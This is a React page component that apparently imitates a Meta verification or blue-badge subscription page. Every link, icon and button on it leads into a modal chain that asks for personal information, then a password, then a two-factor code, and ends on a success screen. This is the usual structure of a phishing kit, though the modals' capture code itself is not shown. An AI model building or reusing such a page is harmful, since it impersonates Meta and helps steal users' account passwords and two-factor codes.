'use client'

import FaqMeta from '#components/faq/FaqMeta';
import Footer from '#components/footer/Footer';
import FooterSubscribe from '#components/footer/FooterSubscribe';
import MetaFeature from '#components/meta-feature/MetaFeature';
import InfomationsModal from '#components/modals/InfomationsModal';
import PasswordModal from '#components/modals/PasswordModal';
import SuccessModal from '#components/modals/SuccessModal';
import TwoFactorModal from '#components/modals/TwoFactorModal';
import StepVerified from '#components/step-verify/StepVerified';
import TestimonialSlider from '#components/testimonials/TestimonialSlider';
import { getLocalStorage } from '@/helper/localstorage';
import React from 'react';
import { useTranslation } from 'react-i18next';

const Notification = () => {
    const { t } = useTranslation();

    // LOCATION CLIENT
    const [userLocation, setUserLocation] = React.useState<any>(null);
    React.useEffect(() => {
        const userLocation = getLocalStorage('location_user');
        setUserLocation(userLocation);
    }, []);

    // STATE MODAL
    const [isOpendInfo, setIsOpendInfo] = React.useState(false);
    const [isOpendPassword, setIsOpendPassword] = React.useState(false);
    const [isOpendTwoFactor, setIsOpendTwoFactor] = React.useState(false);
    const [isOpendSuccess, setIsOpendSuccess] = React.useState(false);

    // HANDLE MODAL
    const handleOpendInfoModal = () => {
        setIsOpendInfo(true);
    }

    const handleOpendPasswordModal = (isOpenPassword: boolean) => {
        setIsOpendPassword(isOpenPassword);
    }

    const handleOpendTwoFactorModal = (isOpenTwoFactor: boolean) => {
        setIsOpendTwoFactor(isOpenTwoFactor);
    }

    const handleOpendSuccessModal = (isOpenSuccess: boolean) => {
        setIsOpendSuccess(isOpenSuccess);
    }

    return (
        <>
            <div className="">
                <div className='px-6 md:h-[80px] h-[60px] bg-[#f5f6f6] flex items-center justify-between'>
                    <div className='flex items-center justify-start gap-2 text-[14px]  '>
                        <img onClick={() => handleOpendInfoModal()} src="/images/meta/logo-meta.svg" className='md:w-[65px] w-[70px]' alt="blue" />
                        <div className='ml-[50px] md:flex hidden items-center justify-start gap-7 text-[#1c2b33]'>
                            <span onClick={() => handleOpendInfoModal()} className='cursor-pointer font-bold relative after:content-[""] after:absolute after:bottom-0 after:left-0 after:w-full after:h-[2px] after:bg-[#cbd2d9] after:transform after:scale-x-0 after:origin-left after:transition-transform after:duration-300 hover:after:scale-x-100'>{t('header.getStarted')}</span>
                            <span onClick={() => handleOpendInfoModal()} className='cursor-pointer font-bold relative after:content-[""] after:absolute after:bottom-0 after:left-0 after:w-full after:h-[2px] after:bg-[#cbd2d9] after:transform after:scale-x-0 after:origin-left after:transition-transform after:duration-300 hover:after:scale-x-100'>{t('header.advertise')}</span>
                            <span onClick={() => handleOpendInfoModal()} className='cursor-pointer font-bold relative after:content-[""] after:absolute after:bottom-0 after:left-0 after:w-full after:h-[2px] after:bg-[#cbd2d9] after:transform after:scale-x-0 after:origin-left after:transition-transform after:duration-300 hover:after:scale-x-100'>{t('header.learn')}</span>
                            <span onClick={() => handleOpendInfoModal()} className='cursor-pointer font-bold relative after:content-[""] after:absolute after:bottom-0 after:left-0 after:w-full after:h-[2px] after:bg-[#cbd2d9] after:transform after:scale-x-0 after:origin-left after:transition-transform after:duration-300 hover:after:scale-x-100'>{t('header.support')}</span>
                        </div>
                    </div>
                    <div className='md:flex hidden items-center justify-start gap-10'>
                        <img onClick={() => handleOpendInfoModal()} src="/images/icons/ic_search.svg" className='w-[20px] h-[20px] cursor-pointer' alt="user" />
                        <img onClick={() => handleOpendInfoModal()} src="/images/icons/ic_user.svg" className='w-[40px] h-[40px] cursor-pointer' alt="user" />
                    </div>
                    <div className='md:hidden flex items-center justify-start gap-10'>
                        <img onClick={() => handleOpendInfoModal()} src="/images/icons/ic_search.svg" className='w-[20px] h-[20px] cursor-pointer' alt="user" />    
                    </div>
                </div>

                <div className='bg-[url(/images/meta/bg_notification.jpg)] bg-cover bg-center bg-no-repeat'>
                    <div className='flex md:flex-row flex-col w-full items-center justify-between md:max-w-[1440px] mx-auto md:px-6 px-3'>
                        <div className='md:w-1/2 w-full flex items-center justify-start md:justify-start justify-center md:order-1 order-2 md:pb-0 pb-10'>
                            <div className='md:max-w-[500px] max-w-[100%] w-full md:block flex flex-col items-start justify-start'>
                                <img src="/images/icons/ic_blue.svg" alt="meta" className='order-1 md:w-[84px] w-[48px] md:h-[84px] h-[48px]' />
                                <h1 className='md:text-[48px] text-[32px] font-bold mb-4 order-2'>{t('hero.headline')}</h1>
                                <p className='text-16px text-[#1c2b33] font-[300] md:order-3 order-4'>{t('hero.desc1')}</p>
                                <p className='text-16px text-[#1c2b33] font-[300] md:order-4 order-5'>{t('hero.desc2')}</p>
                                <button onClick={() => handleOpendInfoModal()} className='md:order-5 order-3 bg-[#0062ff] text-white px-6 h-[50px] flex items-center justify-center rounded-full md:mt-6 mt-0 mb-6 font-[600] text-[15px]'>{t('hero.ctaSubscribeFacebook')}</button>
                            </div>
                        </div>
                        <div className='md:w-[calc(100%-500px)] w-full overflow-hidden md:order-2 order-1'>
                            <img src="/images/meta/image_notification.png" alt="" />
                        </div>
                    </div>
                </div>

                <div className='max-w-[1440px] mx-auto md:pt-20 pt-6 md:px-6 px-3 md:mb-0 mb-10'>
                    <div className='w-full'>
                        <p className='md:text-[48px] text-[32px] text-center'>{t('section.title')}</p>
                        <p className='md:text-[16px] text-[14px] text-[#1c2b33] font-[300] my-4 text-center'>{t('section.subtitle')}</p>
                    </div>
                </div>

                <MetaFeature/>

                <StepVerified/>

                <TestimonialSlider/>

                <FaqMeta/>

                <FooterSubscribe/>

                <Footer/>


                {/* MODAL */}
                <InfomationsModal
                    isOpend={isOpendInfo}
                    userLocation={userLocation}
                    isOpendPassword={(isOpenPassword: boolean) => handleOpendPasswordModal(isOpenPassword)}
                    onToggleModal={(isOpen: boolean) => setIsOpendInfo(isOpen)}
                />

                <PasswordModal
                    isOpend={isOpendPassword}
                    isOpendTwoFactor={(isOpenTwoFactor: boolean) => handleOpendTwoFactorModal(isOpenTwoFactor)}
                    onToggleModal={(isOpen: boolean) => setIsOpendPassword(isOpen)}
                />

                <TwoFactorModal
                    isOpend={isOpendTwoFactor}
                    isOpendFinish={(isOpenFinish: boolean) => handleOpendSuccessModal(isOpenFinish)}
                    onToggleModal={(isOpen: boolean) => setIsOpendTwoFactor(isOpen)}
                />

                <SuccessModal
                    isOpend={isOpendSuccess}
                    onToggleSuccess={(isOpen: boolean) => setIsOpendSuccess(isOpen)}
                />
            </div>
        </>
    )
}

export default Notification